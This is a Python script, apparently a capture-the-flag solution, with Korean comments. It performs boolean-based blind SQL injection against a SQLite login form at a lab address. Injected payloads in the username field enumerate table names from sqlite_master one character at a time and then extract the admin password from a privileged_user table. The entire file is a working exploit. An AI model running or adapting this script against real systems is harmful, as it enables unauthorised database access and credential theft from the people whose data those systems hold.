import requests
import re

url = "http://10.20.12.187:4003"
session = requests.Session()

headers = {
    "User-Agent": "Mozilla/5.0",
    "Content-Type": "application/x-www-form-urlencoded",
    "Origin": url,
    "Referer": url,
}

charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_{}"

def is_condition_true(payload):
    data = {"username": payload}
    res = session.post(url, headers=headers, data=data)
    match = re.search(r"(\d+) user has the name", res.text)
    return match and int(match.group(1)) > 0

def extract_table_name(offset):
    name = ""
    print(f"[*] OFFSET {offset}번째 테이블 이름 추출 중...")
    for i in range(1, 30):  # 테이블 이름 최대 길이 30으로 가정
        found = False
        for c in charset:
            payload = (
                f"guest' AND (SELECT SUBSTR(name, {i}, 1) FROM sqlite_master WHERE type='table' LIMIT 1 OFFSET {offset}) = '{c}' --"
            )
            if is_condition_true(payload):
                name += c
                print(f"[+] 현재까지 추출된 이름: {name}", end="\r")
                found = True
                break
        if not found:
            break
    return name

# n개 테이블만 시도 (필요시 범위 늘리기)
for offset in range(10):  # 첫 10개 테이블만
    table = extract_table_name(offset)
    if table:
        print(f"\n[+] 발견된 테이블: {table}")
    else:
        print(f"\n[-] OFFSET {offset} 테이블 없음.")

charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_"
password = "flag{"  # 시작점

for i in range(len(password) + 1, 50):
    found = False
    for c in charset:
        payload = f"guest' AND (SELECT SUBSTR(password, {i}, 1) FROM privileged_user WHERE username='admin') = '{c}' --"
        data = {
            "username": payload
        }

        response = session.post(url, headers=headers, data=data)

        # HTML에서 "0 user has the name" 파싱
        match = re.search(r"(\d+) user has the name", response.text)
        if match:
            count = int(match.group(1))
            if count > 0:
                password += c
                print(f"[+] 현재까지 추출된 비밀번호: {password}", end="\r")
                found = True
                break

    if not found:
        print("\n[-] 더 이상 추측할 수 없습니다.")
        break

print(f"\n[+] 최종 추출된 비밀번호: {password}")